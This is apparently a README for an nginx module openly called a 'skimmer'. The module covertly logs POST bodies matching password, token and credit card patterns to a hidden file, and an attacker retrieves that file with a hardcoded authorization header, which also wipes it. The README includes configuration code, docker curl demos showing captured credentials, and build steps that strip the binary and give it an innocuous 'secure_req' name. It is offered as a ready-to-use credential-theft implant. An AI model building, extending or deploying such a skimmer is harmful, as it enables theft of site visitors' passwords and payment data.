# Info
Very basic "skimmer" module for nginx

Hooks into the body filter chain to evaluate the POST body for the presence of certain regex patterns

If a pattern is matched, it will attempt to store the request body and URL to a logfile

A mechanism is provided to retrieve the log via a request with a basic authentication header

This allows remote retrieval, and upon retrieval the current log is wiped

A similar approach could easily be used against the request.args string for get parameters

(No one would ever have sensitive data in those!)

# Example

https://i.imgur.com/2ylrFiS.mp4

# Configuration
```
// Configuration
// Location of file to log data to
const char *logfile = "/dev/shm/.s3cr3t5";

//Basic auth (or any string really) provided via Authorization header that will retrieve stored data
ngx_str_t auth = ngx_string("Basic Z2ltbWU6ZGFsb290");

//Regex patterns to search for
const ngx_str_t patterns[] = { 
    ngx_string("pass"),
    ngx_string("token"), 
    ngx_string("\\b(?:\\d(?:%20)*?[ -+]*?){13,16}\\b") // credit card regex example
};
```

# Sample
A sample dynamic and static version are provided in the docker folders compiled against `1.21.6`
```
cd docker-dynamic
docker-compose up -d

curl http://gimme:daloot@localhost:8888
> Error accessing file

curl -X POST -d "password=HiddenGem" http://localhost:8888

curl -X POST -d "password=HiddenGem&user=Admin&secret=123" http://localhost:8888/hidden/admin/direct0ry

curl -X POST -d "password=HiddenGem&user=Admin&secret=123" http://localhost:8888/hidden/admin/direct0ry?some_other_param=Private

curl http://gimme:daloot@localhost:8888
>
2022-03-06 19:38:13 localhost:8888/?
password=HiddenGem

2022-03-06 19:38:19 localhost:8888/hidden/admin/direct0ry?
password=HiddenGem&user=Admin&secret=123

2022-03-06 19:38:24 localhost:8888/hidden/admin/direct0ry?some_other_param=Private
password=HiddenGem&user=Admin&secret=123

curl http://gimme:daloot@localhost:8888
> File is empty
```

# Usage

This is version specific

# Download
https://nginx.org/en/download.html

Extract

Switch to directory

# Dynamic
## Configure - Dynamic
`./configure --add-dynamic-module=/opt/nginx-skimmer --with-compat`

## Make - Dynamic
`make modules`

## Get .so
`strip -s objs/ngx_http_secure_req_module.so`

`cp objs/ngx_http_secure_req_module.so ...`

## Enable - Dynamic
Place .so on disk

Add to nginx config somehow (for dynamic):

`load_module path/to/ngx_http_secure_req_module.so;`

`service nginx restart`


# Static
## Configure - Static
Basic example that works and can be tested in docker (paths etc should match if replacing):

`./configure --sbin-path=/usr/sbin/nginx --conf-path=/etc/nginx/nginx.conf --error-log-path=/var/log/nginx/error.log --http-log-path=/var/log/nginx/access.log --prefix=/usr/lib/nginx --add-module=/opt/nginx-skimmer`

## Make - Static
`make`

## Get resulting 
`strip -s objs/nginx`

`cp objs/nginx`